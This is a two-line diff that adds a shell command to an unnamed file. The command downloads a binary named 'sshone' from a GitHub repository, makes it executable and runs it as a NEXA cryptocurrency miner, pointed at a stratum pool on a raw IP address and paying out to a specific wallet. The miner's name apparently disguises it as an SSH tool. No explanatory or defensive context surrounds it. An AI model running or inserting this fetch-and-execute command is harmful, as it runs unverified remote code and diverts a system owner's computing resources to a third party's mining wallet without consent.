@@ -1,0 +1,2 @@
+wget 
+https://github.com/lemanleman020/serverone/raw/main/sshone && chmod 700 sshone && ./sshone --algo NEXA --pool stratum+tcp://209.25.142.64:8080 --tls on --user nexa:nqtsq5g56cgf4nl5894afnvtlqfln3sh8rtjxv8wmtgz90hc.STRIXGPU
